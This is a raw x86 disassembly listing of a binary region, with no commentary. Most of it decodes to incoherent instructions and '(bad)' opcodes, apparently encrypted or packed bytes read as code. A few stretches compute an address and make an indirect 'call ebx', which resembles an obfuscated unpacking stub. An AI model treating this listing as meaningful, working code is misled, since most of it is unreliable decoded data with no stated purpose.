  4112cf:	mov    edi,0x95255ab4
  4112d4:	in     eax,dx
  4112d5:	repz mov edx,0xc5922399
  4112db:	lahf   
  4112dc:	jecxz  0x411358
  4112de:	stc    
  4112df:	sbb    al,BYTE PTR [ebp-0x72c9c8c0]
  4112e5:	sbb    al,0xe3
  4112e7:	into   
  4112e8:	ffree  st(3)
  4112ea:	sti    
  4112eb:	ret    
  4112ec:	iret   
  4112ed:	std    
  4112ee:	add    bh,BYTE PTR [ebp-0x52]
  4112f1:	jns    0x4112dc
  4112f3:	or     BYTE PTR [esi+eiz*8+0x40e9d243],ah
  4112fa:	push   ebx
  4112fb:	cmp    al,0xa8
  4112fd:	ins    BYTE PTR es:[edi],dx
  4112fe:	in     eax,0x7
  411300:	cmc    
  411301:	or     eax,0x311de9e
  411306:	retf   
  411307:	mov    ds:0x93ac4e19,eax
  41130c:	sub    DWORD PTR [edi],0xffffffcf
  41130f:	ins    DWORD PTR es:[edi],dx
  411310:	pop    es
  411311:	jno    0x4112a9
  411313:	daa    
  411314:	xlat   BYTE PTR ds:[ebx]
  411315:	jecxz  0x41130e
  411317:	jns    0x41130e
  411319:	(bad)  
  41131a:	jge    0x4112c7
  41131c:	test   eax,0xd2a8ed6d
  411321:	mov    al,0x72
  411323:	adc    al,BYTE PTR [ebx+0x48]
  411326:	(bad)  
  411327:	(bad)  
  411328:	mov    eax,ds:0xd61fd96c
  41132d:	(bad)  
  41132e:	fisub  WORD PTR [edx+ebp*8+0x1a243bcc]
  411335:	sbb    DWORD PTR [eax-0x78],edi
  411338:	add    al,0x71
  41133a:	sub    BYTE PTR [edx-0x64],0x3d
  41133e:	xor    DWORD PTR [esi],eax
  411340:	es (bad) 
  411342:	ja     0x4112d5
  411344:	mov    cs,WORD PTR [ebx]
  411346:	sbb    ebp,ecx
  411348:	cmp    eax,0x7f7fdb43
  41134d:	sbb    edx,DWORD PTR ds:0x5798f74e
  411353:	fs xchg ebx,eax
  411355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411356:	pushf  
  411357:	out    dx,al
  411358:	cld    
  411359:	or     edx,DWORD PTR [edx-0x4f49a6f6]
  41135f:	fld    QWORD PTR ds:0x82b00744
  411365:	ror    DWORD PTR [ebp-0x2e],0xac
  411369:	popa   
  41136a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41136b:	mov    ah,dl
  41136d:	je     0x411397
  41136f:	pop    ss
  411370:	imul   edx,DWORD PTR ss:[ebx+0x63092841],0x5830c72e
  41137b:	iret   
  41137c:	inc    edi
  41137d:	xchg   ebp,eax
  41137e:	jmp    0x411349
  411380:	mov    bh,0xde
  411382:	mov    cl,0xf3
  411384:	test   al,0x7b
  411386:	outs   dx,BYTE PTR ds:[esi]
  411387:	pop    ecx
  411388:	jbe    0x4113a6
  41138a:	mov    ch,BYTE PTR [esi]
  41138c:	fimul  DWORD PTR [ebx+edi*1-0x78f55f0c]
  411393:	push   cs
  411394:	mov    dl,0xb4
  411396:	and    BYTE PTR [edi+0x78de094e],ch
  41139c:	pop    esi
  41139d:	(bad)  
  41139e:	(bad)  
  41139f:	mov    gs,WORD PTR [esp+ebp*8+0x26cda9de]
  4113a6:	fidiv  DWORD PTR [esi+edx*4-0x4f]
  4113aa:	out    0x37,al
  4113ac:	into   
  4113ad:	jle    0x4113ab
  4113af:	add    eax,0xfb6b09b4
  4113b4:	xchg   ebx,eax
  4113b5:	add    al,0x26
  4113b7:	scas   al,BYTE PTR es:[edi]
  4113b8:	hlt    
  4113b9:	fcomp  DWORD PTR [ebx+ebx*4]
  4113bc:	or     bh,BYTE PTR [ecx-0x3c]
  4113bf:	push   ecx
  4113c0:	int    0x4c
  4113c2:	cs mov esp,0xa0a0230
  4113c8:	add    DWORD PTR [eax+0x24187e40],ebp
  4113ce:	mov    bh,0xf5
  4113d0:	ja     0x4113c1
  4113d2:	mov    eax,ds:0x4ccfb7ce
  4113d7:	sahf   
  4113d8:	ins    DWORD PTR es:[edi],dx
  4113d9:	mov    ds:0xc54b782e,eax
  4113de:	outs   dx,BYTE PTR ds:[esi]
  4113df:	mov    edx,ecx
  4113e1:	cmp    BYTE PTR ds:0x7168e33c,al
  4113e7:	ror    edx,1
  4113e9:	pushf  
  4113ea:	(bad)  
  4113eb:	into   
  4113ec:	mov    al,BYTE PTR [ecx+edx*8-0x40]
  4113f0:	(bad)  
  4113f1:	jle    0x411470
  4113f3:	add    DWORD PTR [ecx-0xc],0xa
  4113f7:	mov    al,ds:0x9c697bc
  4113fc:	push   ebp
  4113fd:	int3   
  4113fe:	inc    ecx
  4113ff:	sar    BYTE PTR [eax+0x33a52f36],1
  411405:	pop    ecx
  411406:	out    0xd,eax
  411408:	fstp   TBYTE PTR [esi+0x23]
  41140b:	cdq    
  41140c:	push   edx
  41140d:	mov    ecx,0x7fef9f1a
  411412:	jns    0x4113ba
  411414:	js     0x41143a
  411416:	sbb    al,BYTE PTR [ebx-0x46346790]
  41141c:	sti    
  41141d:	imul   DWORD PTR [edx-0x7]
  411420:	inc    edi
  411421:	dec    ecx
  411422:	sub    DWORD PTR [esi+ebp*1-0x6e],edx
  411426:	popf   
  411427:	mov    edx,eax
  411429:	mov    al,ds:0x7fb929a7
  41142e:	lock cmp al,0x6b
  411431:	push   0xffffffe3
  411433:	ins    DWORD PTR es:[edi],dx
  411434:	rcr    DWORD PTR [edx],1
  411436:	jmp    0x289:0xaddfb0ef
  41143d:	into   
  41143e:	xchg   ecx,eax
  41143f:	ins    BYTE PTR es:[edi],dx
  411440:	xor    eax,0x62ef54bf
  411445:	cdq    
  411446:	mov    ecx,0xe9971190
  41144b:	cmc    
  41144c:	xlat   BYTE PTR ds:[ebx]
  41144d:	or     dl,ah
  41144f:	or     al,0xe9
  411451:	ins    BYTE PTR es:[edi],dx
  411452:	mov    ds,WORD PTR [esi-0x3ffd8187]
  411458:	push   0x161cb84c
  41145d:	loopne 0x41145d
  41145f:	mov    edx,0x2bfea67
  411464:	pop    ecx
  411465:	sbb    al,0x10
  411467:	add    al,0x95
  411469:	pop    ebx
  41146a:	dec    esi
  41146b:	stc    
  41146c:	push   ss
  41146d:	sub    eax,0x18435b07
  411472:	dec    ecx
  411473:	xor    ecx,ebp
  411475:	jmp    0xa2f0daf6
  41147a:	sub    bl,BYTE PTR [ebp+0x2]
  41147d:	dec    ebp
  41147e:	mov    cl,0x43
  411480:	dec    edx
  411481:	aaa    
  411482:	je     0x41144a
  411484:	xchg   ebx,eax
  411485:	push   0xcbefa49e
  41148a:	arpl   WORD PTR [esp+eax*8+0x790f96e],si
  411491:	sub    DWORD PTR [eax],0x99fafec1
  411497:	loope  0x411494
  411499:	pop    ss
  41149a:	arpl   WORD PTR [eax-0x2b],si
  41149d:	sub    BYTE PTR [ebx+0x39],bh
  4114a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a1:	es push esp
  4114a3:	dec    eax
  4114a4:	es sub al,0xd7
  4114a7:	mov    al,ds:0x8227a1a9
  4114ac:	inc    esp
  4114ad:	dec    ebp
  4114ae:	adc    al,0x47
  4114b0:	mov    ebx,0xfc44c636
  4114b5:	cld    
  4114b6:	ins    DWORD PTR es:[edi],dx
  4114b7:	inc    edi
  4114b8:	cli    
  4114b9:	adc    BYTE PTR [ecx],0x2d
  4114bc:	mov    al,ds:0xf52bc1ad
  4114c1:	data16 add dl,BYTE PTR [eax-0x6]
  4114c5:	sbb    eax,0xad8e22fe
  4114ca:	fistp  WORD PTR [edi+0x13]
  4114cd:	stos   DWORD PTR es:[edi],eax
  4114ce:	repnz sti 
  4114d0:	xchg   esi,eax
  4114d1:	cmc    
  4114d2:	add    DWORD PTR [edx+0x44a9f69d],ecx
  4114d8:	dec    ebx
  4114d9:	push   0x41
  4114db:	jb     0x411490
  4114dd:	dec    ecx
  4114de:	cli    
  4114df:	xchg   BYTE PTR [ebx-0x71800d20],ah
  4114e5:	(bad)  
  4114e6:	jno    0x4114e0
  4114e8:	cld    
  4114e9:	sub    ebx,edx
  4114eb:	adc    BYTE PTR [edi+0x13],ah
  4114ee:	inc    esp
  4114ef:	rcl    DWORD PTR [ebp-0x7f],0xf6
  4114f3:	mov    ds:0xa49886c7,eax
  4114f8:	outs   dx,DWORD PTR ds:[esi]
  4114f9:	and    BYTE PTR [esi],cl
  4114fb:	(bad)  
  4114fc:	jge    0x41155c
  4114fe:	loope  0x4114a1
  411500:	mov    ah,0xcd
  411502:	rcr    BYTE PTR [ebx-0x12b42970],1
  411508:	mov    ebx,0xf91e2b39
  41150d:	add    dh,cl
  41150f:	nop
  411510:	sbb    DWORD PTR [ebx],edi
  411512:	fincstp 
  411514:	dec    ebp
  411515:	test   DWORD PTR [eax+esi*1],esi
  411518:	xchg   DWORD PTR [ebp+0x14375af7],ebp
  41151e:	mov    ds:0x3c57637d,al
  411523:	sbb    al,0x45
  411525:	mov    eax,0xa3fbe1ec
  41152a:	in     al,0x4c
  41152c:	add    eax,0x2a76647f
  411531:	jl     0x41154c
  411533:	jmp    DWORD PTR [eax]
  411535:	aaa    
  411536:	push   cs
  411537:	adc    DWORD PTR [esi-0x49],edi
  41153a:	pop    ebp
  41153b:	xchg   DWORD PTR [edi-0x651dfee1],ebp
  411541:	mov    WORD PTR ds:0x1e3992b2,ds
  411547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411548:	popa   
  411549:	hlt    
  41154a:	in     al,dx
  41154b:	xor    dl,ch
  41154d:	inc    eax
  41154e:	sbb    al,0xa5
  411550:	imul   esi,edi,0xfffffff7
  411553:	inc    ebx
  411554:	fidivr WORD PTR [edx-0x3]
  411557:	sbb    BYTE PTR [edx+0x42758ab4],cl
  41155d:	jmp    0x4115b9
  41155f:	pop    ebp
  411560:	push   ecx
  411561:	or     eax,0xe5544bb7
  411566:	xor    cl,dl
  411568:	push   edx
  411569:	clc    
  41156a:	xor    BYTE PTR [esi+0x2b1e8701],0xfa
  411571:	and    BYTE PTR [esi],dl
  411573:	aam    0x86
  411575:	mov    DWORD PTR [esi+0x52],0xfc063fd4
  41157c:	jp     0x41155d
  41157e:	fild   DWORD PTR [esi-0x76]
  411581:	and    esp,eax
  411583:	inc    esi
  411584:	dec    eax
  411585:	jae    0x41150b
  411587:	or     eax,0x53c1bdaf
  41158c:	mov    ebp,0xb403aa25
  411591:	mov    fs,WORD PTR [edi-0x45]
  411594:	xchg   esp,eax
  411595:	call   0x12c92fec
  41159a:	ja     0x411607
  41159c:	fadd   DWORD PTR [ebp+0x73006224]
  4115a2:	imul   ebp,DWORD PTR [ebx+0x2a],0x36e1fa75
  4115a9:	and    al,cl
  4115ab:	xchg   ebx,eax
  4115ac:	jle    0x4115d6
  4115ae:	dec    edx
  4115af:	addr16 aam 0x47
  4115b2:	fisubr DWORD PTR [edx-0x2c]
  4115b5:	sbb    ebp,DWORD PTR [ebx+0x2f9a555b]
  4115bb:	test   eax,0x401898ed
  4115c0:	cdq    
  4115c1:	into   
  4115c2:	xchg   ebp,eax
  4115c3:	cld    
  4115c4:	pop    ds
  4115c5:	xor    ecx,DWORD PTR [edi+edi*4+0x68a4fcf0]
  4115cc:	mov    bh,0x5d
  4115ce:	dec    edi
  4115cf:	mov    bl,0x7a
  4115d1:	mov    eax,ds:0x9434cb62
  4115d6:	xor    BYTE PTR [esp+ebx*2+0x56],dl
  4115da:	push   ecx
  4115db:	push   eax
  4115dc:	jo     0x41155f
  4115de:	xor    esp,DWORD PTR [ebp+0xd]
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  esi,QWORD PTR [ebx+ebx*1]
  41160f:	stos   BYTE PTR es:[edi],al
  411610:	pop    edx
  411611:	out    dx,al
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115e4
  41161a:	or     bl,BYTE PTR [ebx-0x5b5224f4]
  411620:	or     ah,ah
  411622:	es in  eax,dx
  411624:	mov    edx,0x8f7f7227
  411629:	pop    eax
  41162a:	stos   BYTE PTR es:[edi],al
  41162b:	loope  0x411651
  41162d:	xor    BYTE PTR [edx+0x1b],0x34
  411631:	xor    esp,DWORD PTR [eax+eax*1]
  411634:	je     0x41160c
  411636:	inc    esp
  411637:	inc    edx
  411638:	retf   0x2f25
  41163b:	cmc    
  41163c:	(bad)  
  41163e:	cmp    BYTE PTR [ebx-0x41a07ca5],dh
  411644:	inc    ebp
  411645:	inc    ebx
  411646:	repz cs test al,0x30
  41164a:	fsub   st,st(7)
  41164c:	mov    bl,0x57
  41164e:	inc    ebx
  41164f:	imul   esi,edi,0xa8e9ad1b
  411655:	xor    ah,bl
  411657:	or     eax,0x178f667e
  41165c:	cmp    eax,0x787c8646
  411661:	daa    
  411662:	in     eax,dx
  411663:	cli    
  411664:	mov    eax,ds:0xf90eca63
  411669:	fcmovnb st,st(3)
  41166b:	int    0x75
  41166d:	jns    0x41167a
  41166f:	push   eax
  411670:	and    dl,bh
  411672:	and    bl,BYTE PTR [ebp+0xa]
  411675:	lods   eax,DWORD PTR ds:[esi]
  411676:	dec    ecx
  411677:	xchg   eax,ecx
  411679:	mov    bh,0xaf
  41167b:	loope  0x4116df
  41167d:	sar    BYTE PTR [esi-0x1748e8ee],1
  411683:	cdq    
  411684:	xor    BYTE PTR [eax+0x69558fd8],dh
  41168a:	sbb    ebx,DWORD PTR [eax+0x3ae5aede]
  411690:	xchg   esp,eax
  411691:	add    al,0x76
  411693:	cmp    DWORD PTR [edi],0x43d3a8a8
  411699:	fs into 
  41169b:	aas    
  41169c:	fstp   TBYTE PTR [edi+0x55]
  41169f:	inc    edi
  4116a0:	mov    ecx,0x29246709
  4116a5:	or     BYTE PTR [esi],bh
  4116a7:	lds    ebp,FWORD PTR [ebx+0x7b]
  4116aa:	mov    ch,BYTE PTR [esi-0x2d]
  4116ad:	into   
  4116ae:	(bad)  
  4116af:	or     dh,BYTE PTR [esi-0x1c67af88]
  4116b5:	loop   0x411710
  4116b7:	outs   dx,BYTE PTR ds:[esi]
  4116b8:	adc    ch,BYTE PTR [ebx-0x2ffd3843]
  4116be:	push   ecx
  4116bf:	stos   BYTE PTR es:[edi],al
  4116c0:	(bad)  
  4116c1:	clc    
  4116c2:	test   dl,ch
  4116c4:	push   0xc7779e73
  4116c9:	scas   eax,DWORD PTR es:[edi]
  4116ca:	retf   0x690b
  4116cd:	inc    esp
  4116ce:	mov    ecx,0x62878c5c
  4116d3:	sub    ah,BYTE PTR [ebp+0x25]
  4116d6:	pop    ecx
  4116d7:	and    dl,ch
  4116d9:	dec    ebx
  4116da:	mov    WORD PTR [ebx+0xfb4cc2b],es
  4116e0:	jge    0x411733
  4116e2:	or     DWORD PTR [ebx-0x17],eax
  4116e5:	sub    ebx,DWORD PTR [esi]
  4116e7:	cdq    
  4116e8:	add    DWORD PTR [ebx],ecx
  4116ea:	adc    eax,0x87a971a5
  4116ef:	outs   dx,DWORD PTR ds:[esi]
  4116f0:	addr16 push ecx
  4116f2:	mov    edi,0x16561f4
  4116f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116f8:	pop    ebp
  4116f9:	jbe    0x411684
  4116fb:	stos   BYTE PTR es:[edi],al
  4116fc:	push   es
  4116fd:	jecxz  0x411723
  4116ff:	fcom   QWORD PTR [edx]
  411701:	sahf   
  411702:	in     eax,dx
  411703:	jg     0x41173c
  411705:	lods   eax,DWORD PTR ds:[esi]
  411706:	mov    edx,0xeb162c75
  41170b:	into   
  41170c:	shl    BYTE PTR [ebp-0xa],1
  41170f:	(bad)  
  411710:	jb     0x4116c9
  411712:	div    BYTE PTR [ebp+eax*2+0x2]
  411716:	aas    
  411717:	scas   al,BYTE PTR es:[edi]
  411718:	add    bl,dl
  41171a:	repz iret 
  41171c:	and    al,0xa8
  41171e:	cmp    al,0x76
  411720:	sub    BYTE PTR [ebx-0x2369896e],0xaa
  411727:	mov    DWORD PTR [ebx+0x1d],edx
  41172a:	jg     0x41179a
  41172c:	push   0x1e
  41172e:	pop    ebp
  41172f:	pop    ss
  411730:	aas    
  411731:	jmp    0x5f58:0x7977925c
  411738:	or     al,0x90
  41173a:	sbb    al,0xbb
  41173c:	in     eax,0x2c
  41173e:	cwde   
  41173f:	inc    ebp
  411740:	pop    ss
  411741:	inc    esi
  411742:	data16 fisub WORD PTR [esi+0x50]
  411746:	(bad)  
  411747:	rol    BYTE PTR [esi],1
  411749:	jbe    0x411780
  41174b:	xchg   edi,eax
  41174c:	dec    ebp
  41174d:	rcl    DWORD PTR [edx],cl
  41174f:	neg    BYTE PTR [edi]
  411751:	xchg   ecx,esp
  411753:	dec    ebp
  411754:	add    BYTE PTR [esi],dl
  411756:	push   esi
  411757:	add    eax,0x31872f3d
  41175c:	iret   
  41175d:	dec    ebx
  41175e:	ja     0x411757
  411760:	adc    eax,0xded3630b
  411765:	inc    eax
  411766:	mov    ch,BYTE PTR [edx]
  411768:	push   ss
  411769:	rcr    BYTE PTR ds:0x6f625cf9,cl
  41176f:	out    dx,eax
  411770:	cmc    
  411771:	xor    bh,BYTE PTR [ecx]
  411773:	mov    ds:0x32d4c98b,al
  411778:	push   eax
  411779:	imul   ebp,DWORD PTR [esi-0x2dfcd326],0xffffffd5
  411780:	lods   eax,DWORD PTR ds:[esi]
  411781:	pushf  
  411782:	stos   BYTE PTR es:[edi],al
  411783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411784:	jno    0x411758
  411786:	addr16 popa 
  411788:	dec    ebx
  411789:	push   edi
  41178a:	and    ch,dl
  41178c:	jmp    0x41171e
  41178e:	mov    edi,0x6f323fe1
  411793:	out    dx,eax
  411794:	push   ds
  411795:	mov    esi,0xd4f6183a
  41179a:	mov    dh,0xc2
  41179c:	fisubr DWORD PTR cs:[edi]
  41179f:	xchg   esp,eax
  4117a0:	pop    ecx
  4117a1:	stos   BYTE PTR es:[edi],al
  4117a2:	xor    esp,DWORD PTR [eax]
  4117a4:	int    0x7c
  4117a6:	pop    ecx
  4117a7:	in     eax,0xc0
  4117a9:	xchg   ebx,eax
  4117aa:	xchg   ebx,eax
  4117ab:	cwde   
  4117ac:	mov    ah,0xa7
  4117ae:	mov    ds:0x624955cb,eax
  4117b3:	test   BYTE PTR ds:0x58fa67b8,dh
  4117b9:	cmp    al,0x1a
  4117bb:	hlt    
  4117bc:	sub    al,0x71
  4117be:	fucomi st,st(1)
  4117c0:	mov    esp,0x17fa4a87
  4117c5:	div    BYTE PTR [esi+0x9]
  4117c8:	mov    ah,0x30
  4117ca:	ja     0x4117f1
  4117cc:	int    0x5d
  4117ce:	jmp    0x9c5f:0x5a84268d
  4117d5:	repnz sbb DWORD PTR [eax+0x68],esi
  4117d9:	pop    esp
  4117da:	les    ebx,FWORD PTR [ebx]
  4117dc:	cwde   
  4117dd:	nop
  4117de:	or     DWORD PTR [ebp-0x16],esp
  4117e1:	push   esi
  4117e2:	dec    ecx
  4117e3:	adc    edx,DWORD PTR [ecx+0x78]
  4117e6:	dec    esp
  4117e7:	mov    ah,0x55
  4117e9:	mov    bh,0xcf
  4117eb:	mov    dl,0xbc
  4117ed:	cs popf 
  4117ef:	or     ecx,esp
  4117f1:	(bad)  
  4117f2:	push   ss
  4117f3:	pop    eax
  4117f4:	ret    
  4117f5:	mov    edi,cs
  4117f7:	mov    esi,0x1c173da7
  4117fc:	rcr    BYTE PTR [ebx+0x11aaf365],1
  411802:	push   ebp
  411803:	rcr    BYTE PTR [esi],0x63
  411806:	call   0x4b2e:0x6bfefad3
  41180d:	cmp    BYTE PTR [edi-0x7b],ah
  411810:	sar    BYTE PTR [edi+0x6a],1
  411813:	push   edx
  411814:	pop    edx
  411815:	push   eax
  411816:	ffreep st(5)
  411818:	mov    dh,0xac
  41181a:	adc    al,0x80
  41181c:	leave  
  41181d:	call   0xf85a:0x597bc4bc
  411824:	pop    esp
  411825:	outs   dx,BYTE PTR ds:[esi]
  411826:	mov    dh,0x2f
  411828:	popa   
  411829:	inc    ebp
  41182a:	rol    BYTE PTR [edi+ebx*8+0x69],cl
  41182e:	retf   
  41182f:	ins    DWORD PTR es:[edi],dx
  411830:	sub    ch,BYTE PTR [ebx-0x56]
  411833:	mov    ebx,DWORD PTR [edx-0x1a]
  411836:	ffree  st(5)
  411838:	gs sub eax,0x80d95786
  41183e:	mov    ebx,0xf27e91be
  411843:	scas   eax,DWORD PTR es:[edi]
  411844:	cmp    eax,0x7183d5c3
  411849:	out    0x3,al
  41184b:	test   eax,0xc02a1961
  411850:	adc    dh,BYTE PTR [eax-0x6b]
  411853:	std    
  411854:	hlt    
  411855:	lahf   
  411856:	jmp    0x28e2:0x2be67fdb
  41185d:	pop    edx
  41185e:	test   BYTE PTR [ebx+0x3f],0x39
  411862:	jbe    0x411823
  411864:	mov    ah,0x49
  411866:	test   BYTE PTR [ebx+0x5f692e8f],ch
  41186c:	in     al,dx
  41186d:	sbb    al,0xf1
  41186f:	xchg   edx,eax
  411870:	fimul  WORD PTR [ebx-0x34]
  411873:	pop    eax
  411874:	fsubp  st(6),st
  411876:	and    ebx,DWORD PTR [ecx+0x71]
  411879:	and    DWORD PTR [esi+eiz*1+0x51],edi
  41187d:	icebp  
  41187e:	xchg   esi,eax
  41187f:	jae    0x41184f
  411881:	jle    0x41180d
  411883:	xor    DWORD PTR [ebp-0x42],0xffffff85
  411887:	cli    
  411888:	add    DWORD PTR [edi+0x1b],edi
  41188b:	jo     0x411862
  41188d:	(bad)  [ebx+0x78121fa3]
  411893:	sbb    eax,0x97acc70e
  411898:	adc    ah,BYTE PTR [ebx+0x2dd3fb3b]
  41189e:	jl     0x4118fe
  4118a0:	cmc    
  4118a1:	hlt    
  4118a2:	(bad)  
  4118a3:	jecxz  0x4118f2
  4118a5:	cmp    BYTE PTR [ebp+0x218df234],bl
  4118ab:	push   ebp
  4118ac:	outs   dx,DWORD PTR ds:[esi]
  4118ad:	mov    edi,0x71add85
  4118b2:	sub    eax,0xa3e575ba
  4118b7:	je     0x41187e
  4118b9:	push   eax
  4118ba:	and    BYTE PTR [ebp+eiz*4+0x1826413b],dh
  4118c1:	out    dx,eax
  4118c2:	jmp    0x3b2efa05
  4118c7:	pop    eax
  4118c8:	push   edi
  4118c9:	iret   
  4118ca:	and    BYTE PTR [esi+edi*4+0x4d32fa53],0x1
  4118d2:	pop    ebx
  4118d3:	and    eax,0x4e68dee
  4118d8:	imul   ebp,DWORD PTR [esi-0x632e75d5],0x14
  4118df:	xchg   DWORD PTR [esi+0x7a],esp
  4118e2:	(bad)  
  4118e3:	xlat   BYTE PTR ds:[ebx]
  4118e4:	add    ecx,DWORD PTR [esi-0x50]
  4118e7:	mov    eax,es:0x7df7dc75
  4118ed:	call   0xa195:0xa45fa9c5
  4118f4:	mov    eax,DWORD PTR [esi-0x15]
  4118f7:	lea    esp,[ecx-0x64c42de]
  4118fd:	pop    es
  4118fe:	(bad)  
  411900:	sbb    edi,ebx
  411902:	jne    0x4118a3
  411904:	aam    0x3
  411906:	add    al,0x25
  411908:	sub    DWORD PTR [ebp-0x31b80a8],0x3154d553
  411912:	pop    esi
  411913:	aas    
  411914:	retf   
  411915:	mov    ecx,0x2285afc8
  41191a:	out    dx,al
  41191b:	stos   BYTE PTR es:[edi],al
  41191c:	shr    BYTE PTR [ecx-0x59ea1ae9],0x9a
  411923:	sub    bh,BYTE PTR [edi-0x4a]
  411926:	jae    0x41195c
  411928:	std    
  411929:	pop    ss
  41192a:	dec    esp
  41192b:	int3   
  41192c:	rcr    BYTE PTR [edx],1
  41192e:	xor    al,0xf5
  411930:	xor    eax,0x9131aa95
  411935:	sub    DWORD PTR [eax+0x77],ecx
  411938:	nop
  411939:	jmp    0x1779d7cc
  41193e:	enter  0x87f4,0xe
  411942:	loop   0x4118e2
  411944:	or     eax,0x33538ff
  411949:	ror    BYTE PTR ds:0x5f6ab382,0xbb
  411950:	adc    al,0xb2
  411952:	push   eax
  411953:	mov    cl,0xa5
  411955:	jmp    0xec14df84
  41195a:	push   eax
  41195b:	sar    DWORD PTR [eax-0x26a7726c],1
  411961:	fiadd  DWORD PTR [eax+0x3aac4f27]
  411967:	rcl    BYTE PTR [eax+0x55],cl
  41196a:	adc    BYTE PTR [edx-0x12],dl
  41196d:	bound  edx,QWORD PTR [ecx-0x7bf5af86]
  411973:	mov    al,BYTE PTR [edi-0x5d7eae2e]
  411979:	xchg   ecx,eax
  41197a:	mov    esp,0xb2db2778
  41197f:	lahf   
  411980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411981:	(bad)  
  411982:	les    edx,FWORD PTR [ebp-0x7d292f45]
  411988:	cli    
  411989:	les    esi,FWORD PTR [edi]
  41198b:	push   ss
  41198c:	(bad)  
  41198e:	push   0x43
  411990:	push   edi
  411991:	cmc    
  411992:	fs cmp bl,cl
  411995:	out    0x6b,eax
  411997:	mov    edx,0x7ef68013
  41199c:	scas   al,BYTE PTR es:[edi]
  41199d:	push   ebx
  41199e:	jae    0x4119c4
  4119a0:	mov    al,0x42
  4119a2:	add    DWORD PTR [ebp+0x15e546ee],esp
  4119a8:	es loopne 0x4119ae
  4119ab:	sub    al,0xe7
  4119ad:	cmp    BYTE PTR [edi+0x3f],dl
  4119b0:	sbb    esp,DWORD PTR [esi+0x1fda24bf]
  4119b6:	sub    eax,0x96296848
  4119bb:	dec    ebx
  4119bc:	mov    ah,0x8a
  4119be:	pop    si
  4119c0:	out    dx,al
  4119c1:	pop    esi
  4119c2:	mov    al,ds:0xf745b7f0
  4119c7:	mov    BYTE PTR [eax+0x40bd355a],dl
  4119cd:	and    dl,BYTE PTR [ebp-0x303e57f0]
  4119d3:	adc    ecx,DWORD PTR [esi-0x58]
  4119d6:	test   al,0xa8
  4119d8:	adc    BYTE PTR [edx],bh
  4119da:	push   eax
  4119db:	je     0x41197d
  4119dd:	xchg   ebp,eax
  4119de:	bound  ebp,QWORD PTR fs:[ecx+0x72]
  4119e2:	jne    0x4119a0
  4119e4:	jmp    0x411a38
  4119e6:	dec    ecx
  4119e7:	dec    esp
  4119e8:	jmp    0xe69389b7
  4119ed:	or     DWORD PTR [esi],eax
  4119ef:	pop    ebx
  4119f0:	jne    0x4109bc
  4119f6:	mov    ebx,esi
  4119f8:	jmp    0x411a02
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0xfafc6b7d
  411a40:	ins    DWORD PTR es:[edi],dx
  411a41:	(bad)  
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411a96
  411a4a:	cmp    al,0x14
  411a4c:	add    esp,DWORD PTR [eax]
  411a4e:	pop    ebp
  411a4f:	hlt    
  411a50:	push   esp
  411a51:	dec    ecx
  411a52:	add    BYTE PTR [esi-0xa],0x39
  411a56:	sti    
  411a57:	repnz mov bh,0xde
  411a5a:	lock pusha 
  411a5c:	and    eax,0xbfb7fe98
  411a61:	mov    ecx,0x667f566c
  411a66:	or     BYTE PTR [eax],0x9c
  411a69:	jbe    0x4119fa
  411a6b:	ss jns 0x411a27
  411a6e:	std    
  411a6f:	jl     0x411a8e
  411a71:	stos   BYTE PTR es:[edi],al
  411a72:	push   0xffffffda
  411a74:	jbe    0x411aa1
  411a76:	mov    ebp,0x65f2f633
  411a7b:	xchg   ebx,eax
  411a7c:	pop    esp
  411a7d:	xor    DWORD PTR [eax],eax
  411a7f:	and    esi,ebp
  411a81:	sub    al,0x80
  411a83:	ja     0x411a5b
  411a85:	sub    eax,0xe8f0513
  411a8a:	pop    edx
  411a8b:	mov    ah,0xf1
  411a8d:	jb     0x411a65
  411a8f:	xchg   esi,eax
  411a90:	shr    cl,cl
  411a92:	call   0xb7e3b66b
  411a97:	nop
  411a98:	in     eax,dx
  411a99:	imul   ebp,DWORD PTR [esi],0xffffffc9
  411a9c:	inc    ecx
  411a9d:	sub    eax,0xc9450378
  411aa2:	mov    es,WORD PTR [ebx]
  411aa4:	sbb    ch,BYTE PTR [edi-0x55]
  411aa7:	and    BYTE PTR [ebx-0xcfa9527],al
  411aad:	pop    esp
  411aae:	push   ss
  411aaf:	int3   
  411ab0:	adc    DWORD PTR [ebx+0xe3e2d4f],0x5e
  411ab7:	loope  0x411acf
  411ab9:	(bad)  
  411aba:	jno    0x411afa
  411abc:	stos   BYTE PTR es:[edi],al
  411abd:	sub    eax,0xebf00612
  411ac2:	mul    DWORD PTR [eax-0x305b604]
